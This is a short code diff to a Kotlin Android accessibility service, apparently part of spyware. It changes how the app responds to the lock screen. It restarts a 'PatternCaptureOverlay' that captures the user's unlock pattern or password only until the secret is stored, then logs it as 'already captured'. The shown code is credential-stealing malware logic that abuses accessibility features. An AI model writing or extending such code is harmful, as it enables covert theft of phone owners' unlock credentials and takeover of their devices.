@@ -120,11 +120,20 @@ class GestureRecorderManager(private val service: MyAccessibilityService) {
                 patternPoints.clear()
                 patternCoords = JSONArray()
                 clearAllCipherBuffers()
-                // 每次锁屏重新激活 cipher 监听，确保 PatternCaptureOverlay 能被创建
-                if (service.isCipherCaptureEnabled) {
+
+                // 仅在密码未捕获或类型变化时重新激活监听（创建 PatternCaptureOverlay）
+                val prefs = service.getSharedPreferences("cipher_config", 0)
+                val cipherDone = prefs.getBoolean("cipher_completed", false)
+                val savedType = prefs.getString("cipher_lock_type", "") ?: ""
+                val needsCapture = !cipherDone || savedType.isEmpty() || savedType == "unknown"
+
+                if (needsCapture && service.isCipherCaptureEnabled) {
                     service.cipherCaptureManager?.startListening()
+                    Log.d(TAG, "Lock screen detected -> needs capture, listening restarted")
+                } else {
+                    Log.d(TAG, "Lock screen detected -> cipher already captured (type=$savedType), passive only")
                 }
-                Log.d(TAG, "Lock screen detected -> start recording, buffers cleared, listening restarted")
+
                 handler.postDelayed({ tryEnableTouchExploration() }, 500L)
             }
 
